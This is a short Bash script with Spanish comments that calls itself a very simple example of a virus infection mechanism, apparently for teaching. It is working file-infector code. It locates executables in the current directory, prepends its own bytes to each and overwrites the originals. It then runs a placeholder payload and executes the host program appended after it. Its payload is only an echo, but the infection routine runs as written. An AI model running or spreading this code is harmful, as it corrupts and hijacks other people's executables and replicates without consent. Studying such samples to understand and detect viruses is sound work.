#!/bin/bash

# Esto es un ejemplo muy sencillo de mecanismo de infección de un virus
TAM=857
# Fase 1. Localización de ejecutables a infectar
for fich in *
do

	if test -x $fich
	then 
		#Esquivar scripts del shell
		if test $(head -n 1 $fich | cut -c 1-11) = "#!/bin/bash"
		then 
			echo "[Skip: $fich]"
			continue 
		fi	

		#Fase 2. Infección de ejecutable.
		echo "[Infectando: $fich]"
		dd if=$0 of=/tmp/virus bs=1 count=$TAM
		cat /tmp/virus $fich> /tmp/infectado
		
		#Mover el resultado sobre el fichero original
		mv /tmp/infectado $fich
		chmod +x $fich
			
	else
		echo "[No ejecutable $fich]"
	fi
done

# Fase 3. Ejecutar payload
echo "ejecutando payload...."


# Fase 4. Ejecutar el programa huesped
dd if=$0 of=/tmp/original bs=1 skip=$TAM 2> /dev/null
chmod +x /tmp/original
/tmp/original
exit 0
#Fin 
#!/bin/bash
echo "Programa huesped"
